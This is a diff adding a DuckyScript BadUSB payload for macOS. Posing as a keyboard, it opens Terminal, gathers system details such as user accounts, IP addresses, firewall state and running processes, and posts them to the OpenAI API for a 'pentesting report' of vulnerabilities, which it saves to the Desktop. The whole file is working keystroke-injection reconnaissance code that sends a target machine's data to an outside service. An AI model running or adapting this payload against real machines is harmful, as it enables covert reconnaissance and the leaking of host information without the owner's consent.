@@ -1,0 +1,144 @@
+REM Author: ooovenenoso
+REM Open Terminal
+DELAY 500
+COMMAND SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Gather system information and save to variables
+STRING system_info=$(cat << EOF
+ENTER
+STRING {
+ENTER
+DELAY 200
+STRING "OS": "$(sw_vers -productName)",
+ENTER
+DELAY 200
+STRING "Version": "$(sw_vers -productVersion)",
+ENTER
+DELAY 200
+STRING "Architecture": "$(uname -m)",
+ENTER
+DELAY 200
+STRING "ComputerName": "$(scutil --get ComputerName)",
+ENTER
+DELAY 200
+STRING "LastBootTime": "$(sysctl -n kern.boottime | awk '{print $4 " " $5}')",
+ENTER
+DELAY 200
+STRING "InstalledUpdates": "$(softwareupdate --history | tail -n +2 | awk '{print $1}' | tr '\n' ', ' | sed 's/, $//')",
+ENTER
+DELAY 200
+STRING "NetworkInfo": "$(ifconfig | grep 'inet ' | awk '{print $2}' | tr '\n' ', ' | sed 's/, $//')",
+ENTER
+DELAY 200
+STRING "FirewallStatus": "$(defaults read /Library/Preferences/com.apple.alf globalstate)",
+ENTER
+DELAY 200
+STRING "UserAccounts": "$(dscl . list /Users | grep -v '^_')",
+ENTER
+DELAY 200
+STRING "RunningProcesses": "$(ps aux | sort -rk 3,3 | head -n 6 | awk '{print $11}' | tr '\n' ', ' | sed 's/, $//')"
+ENTER
+STRING }
+ENTER
+STRING EOF
+ENTER
+DELAY 500
+
+REM Requesting GPT to format response in HTML
+STRING prompt_text="Given the detailed system information: OS: $(echo $system_info | jq -r '.OS'), Version: $(echo $system_info | jq -r '.Version'), Architecture: $(echo $system_info | jq -r '.Architecture'), Computer Name: $(echo $system_info | jq -r '.ComputerName'), Last Boot Time: $(echo $system_info | jq -r '.LastBootTime'), Installed Updates: $(echo $system_info | jq -r '.InstalledUpdates'), Network Info: $(echo $system_info | jq -r '.NetworkInfo'), Firewall Status: $(echo $system_info | jq -r '.FirewallStatus'), User Accounts: $(echo $system_info | jq -r '.UserAccounts'), Running Processes: $(echo $system_info | jq -r '.RunningProcesses'), provide a pentesting report identifying potential vulnerabilities in English, formatted in HTML with headers and bullet points for recommendations."
+ENTER
+DELAY 500
+
+STRING messages=$(cat << EOF
+ENTER
+STRING [
+ENTER
+DELAY 1000
+STRING { "role": "system", "content": "You are analyzing detailed system information for potential vulnerabilities." },
+ENTER
+DELAY 1000
+STRING { "role": "user", "content": "$prompt_text" }
+ENTER
+STRING ]
+ENTER
+STRING EOF
+ENTER
+DELAY 500
+
+STRING headers=$(cat << EOF
+ENTER
+STRING {
+ENTER
+DELAY 500
+STRING "Authorization": "Bearer YOUR_OPENAI_API_KEY",
+ENTER
+DELAY 500
+STRING "Content-Type": "application/json"
+ENTER
+STRING }
+ENTER
+STRING EOF
+ENTER
+DELAY 500
+
+STRING response=$(curl -s -X POST "https://api.openai.com/v1/chat/completions" -H "$(echo $headers | jq -r 'to_entries | .[] | "\(.key): \(.value)"')" -d "$(echo '{"model": "gpt-3.5-turbo", "messages": '"$messages"'}' | jq -c)")
+ENTER
+DELAY 500
+
+STRING htmlContent=$(cat << EOF
+ENTER
+STRING <html>
+ENTER
+DELAY 500
+STRING <head>
+ENTER
+DELAY 500
+STRING <title>Pentesting Report BadUSB-GPT</title>
+ENTER
+DELAY 500
+STRING <style>
+ENTER
+DELAY 500
+STRING body {font-family: Arial, sans-serif; margin: 40px;}
+ENTER
+DELAY 500
+STRING h2 {color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px;}
+ENTER
+DELAY 500
+STRING h3 {color: #555; margin-top: 20px;}
+ENTER
+DELAY 500
+STRING p, ul {margin-bottom: 20px;}
+ENTER
+DELAY 500
+STRING </style>
+ENTER
+DELAY 500
+STRING </head>
+ENTER
+DELAY 500
+STRING <body>
+ENTER
+DELAY 500
+STRING <h2>Pentesting Report</h2>
+ENTER
+DELAY 500
+STRING $(echo $response | jq -r '.choices[0].message.content')
+ENTER
+DELAY 500
+STRING </body>
+ENTER
+DELAY 500
+STRING </html>
+ENTER
+STRING EOF
+ENTER
+DELAY 500
+
+STRING echo "$htmlContent" > ~/Desktop/Pentesting_Report.html
+ENTER
